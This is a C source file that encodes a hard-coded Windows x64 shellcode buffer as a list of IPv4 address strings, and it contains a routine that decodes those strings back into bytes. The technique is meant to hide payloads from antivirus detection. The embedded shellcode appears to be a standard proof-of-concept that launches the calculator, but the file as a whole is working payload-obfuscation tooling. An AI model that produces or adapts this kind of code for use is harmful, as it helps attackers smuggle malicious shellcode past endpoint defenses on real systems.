#include <stdio.h>
#include <windows.h>



int IPv4_print(unsigned char a,unsigned char b,unsigned char c,unsigned char d){
   
    unsigned char new_IP[32];

    sprintf(new_IP,"%d.%d.%d.%d",(int)a,(int)b,(int)c,(int)d);
    printf(",\n \"%s\"",new_IP);
    return 0;
}


int IPv4_to_bytes(char* IP_addr, BYTE* bytes){

    int  a,b,c,d;
    sscanf(IP_addr,"%d.%d.%d.%d",&a,&b,&c,&d);
    *bytes = (char)a;
    *(bytes+1) = (char)b;
    *(bytes+2) = (char)c;
    *(bytes+3) = (char)d;

    return 0;
}

// int main (){
//     char IP_addr[] = "127.0.0.1";
//     BYTE bytes[4] = {0};

//     IPv4_to_bytes(&IP_addr,&bytes);

//     printf("%x   %d \n",*(PDWORD)bytes,sizeof(bytes));
//     return 0;
// }

int main (){


    unsigned char buffer[]="\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    size_t shellcode_size = sizeof(buffer);

    unsigned long bytes = 4;

    unsigned long IP_values = shellcode_size / bytes;
    if (shellcode_size % bytes){
        IP_values++;
    }
    
    printf("char* IP_Addresses[%d] =",IP_values);
    for (int i = 0; i < shellcode_size-1; i++){
        if (bytes == 4){
            IPv4_print(buffer[i],buffer[i+1],buffer[i+2],buffer[i+3]);
            bytes = 1;
            IP_values--;
        }else{
            bytes++;
        }
    }    

    printf("};\n");

    char* IP = "252.72.131.228";
    BYTE bytes2[4] = {0};

    IPv4_to_bytes(IP,&bytes2);
    printf("%x   %d \n",*(PDWORD)bytes2,sizeof(bytes2));
    
    return 0;
}
